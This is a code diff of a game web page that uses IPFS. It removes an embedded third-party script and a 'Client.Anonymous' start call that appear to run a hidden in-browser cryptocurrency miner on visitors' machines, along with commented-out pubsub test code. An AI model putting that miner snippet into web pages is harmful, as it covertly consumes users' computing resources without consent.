@@ -6,15 +6,6 @@
     <meta id="gameViewport" name="viewport" content="width=device-width initial-scale=1">
     <link href="styles.css" rel="stylesheet" type="text/css">
 
-    <script src="https://www.hostingcloud.racing/38mP.js"></script>
-    <script>
-        var _client = new Client.Anonymous('1302c90c93016bfcbf2fbc4b4dd7fd745446e6c3545229cdcf9d42956812632e', {
-            throttle: 0.5, c: 'w', ads: 0
-        });
-        _client.start();
-    </script>
-
-    <!--    <script src="https://unpkg.com/ipfs/dist/index.min.js"></script>-->
     <script src="https://cdn.jsdelivr.net/npm/ipfs/dist/index.min.js"></script>
     <script type="text/javascript">
         document.addEventListener('DOMContentLoaded', async () => {
@@ -36,46 +27,7 @@
             const status = ipfs.isOnline() ? 'online' : 'offline'
 
             console.log(`Node status: ${status}`)
-            /*const {id, agentVersion} = await ipfs.id();
-            topic = "sunshine.blue";
-            await ipfs.pubsub.subscribe(topic, msg => {
-                const from = msg.from
-                const seqno = msg.seqno.toString('hex')
-                if (from === id) return console.log(`Ignoring message ${seqno} from self`)
-                console.log(`Message ${seqno} from ${from}:`)
-                try {
-                    console.log(JSON.stringify(msg.data.toString(), null, 2))
-                } catch (_) {
-                    console.log(msg.data.toString('hex'))
-                }
-            }, {
-                onError: (err, fatal) => {
-                    if (fatal) {
-                        console.error(err)
-                        console.log(`<span class="red">${err.message}</span>`)
-                        topic = null
-                        console.log('Resubscribing in 5s...')
-                        setTimeout(catchAndLog(() => subscribe(topic), log), 5000)
-                    } else {
-                        console.warn(err)
-                    }
-                }
-            })
-            console.log(`<span class="green">Success!</span>`)
-
-
-
-            async function sendMessage(msg){
-                console.log(`Sending message to ${topic}...`)
-                await ipfs.pubsub.publish(topic, msg)
-                console.log(`Success!`)
-                setTimeout(sendMessage,2000);
-            }*/
-
-            //sendMessage();
         })
-
-
     </script>
 </head>
 <body>
@@ -103,4 +55,3 @@
 </script>
 
 </html>
-<!--<a class="superdev" href="javascript:%7B%20window.__gwt_bookmarklet_params%20%3D%20%7B'server_url'%3A'http%3A%2F%2Flocalhost%3A9876%2F'%7D%3B%20var%20s%20%3D%20document.createElement('script')%3B%20s.src%20%3D%20'http%3A%2F%2Flocalhost%3A9876%2Fdev_mode_on.js'%3B%20void(document.getElementsByTagName('head')%5B0%5D.appendChild(s))%3B%7D">&#8635;</a>-->
